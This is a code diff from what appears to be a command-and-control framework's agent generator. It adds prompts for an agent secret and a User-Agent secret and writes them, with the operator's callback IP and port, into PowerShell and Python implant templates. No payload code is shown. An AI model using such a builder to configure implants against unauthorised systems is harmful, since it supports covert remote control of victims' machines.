@@ -279,7 +279,16 @@ NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmomNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmo.dNNNNNNNN
 			},
 			{'type':'input',
 			'name':'port',
-			'message':'Enter Port'}
+			'message':'Enter Port'},
+			{'type':'input',
+			'name':'user-agent',
+			'message':'Enter User-Agent Secret'}
+			,
+			{'type':'input',
+			'name':'secret',
+			'message':'Enter Agent Secret'
+
+			}
 			]
 			answers2 = prompt(ip_port_question,style=custom_style_1)
 			try:
@@ -287,6 +296,8 @@ NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmomNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmo.dNNNNNNNN
 					data = f.readlines()
 				f.close()
 				new_url = "https://{}:{}".format(answers2['ip'],answers2['port'])
+				data[54] = "    \"User-Agent\"     =\"{}\"\n".format(answers2['user-agent'])
+				data[55] = "    \"Agent\"          ='{}'\n".format(answers2['secret'])
 				data[57] = "$url = \"{}\"\n".format(new_url)
 				with open("Agents/Created_Agents/Agent.ps1","w") as f:
 					f.writelines(data)
@@ -312,14 +323,29 @@ NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmomNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmo.dNNNNNNNN
 			'name':'port',
 			'message':'Enter Port'
 
-			}]
+			},
+			{'type':'input',
+			'name':'user-agent',
+			'message':"Enter User-Agent Secret"},
+			{
+			'type':'input',
+			'name':'secret',
+			'message':"Enter Agent Secret"
+			}
+			]
 			answers2 = prompt(ip_port_question, style=custom_style_1)
 			try:
 				with open('Agents/agent.py','r') as f:
 					data = f.readlines()
 				f.close()
+				#	  'User-Agent': 'QmxhY2tUYWJieQo=',
+	  			#	  'Agent': 'TGVhcm5pbmdDVG9CRWxpdGUK',
 				new_url = "https://{}:{}/".format(answers2['ip'],answers2['port'])
-				data[11] = "url = \"{}\"\n".format(new_url)
+				new_UA = "	  'User-Agent':'{}',\n".format(answers2['user-agent'])
+				new_A = "	  'Agent': '{}',\n".format(answers2['secret'])
+				data[11] = "	url = \"{}\"\n".format(new_url)
+				data[19] = new_UA
+				data[20] = new_A
 				with open("Agents/Created_Agents/Agent.py",'w') as f:
 					f.writelines(data)
 				f.close()
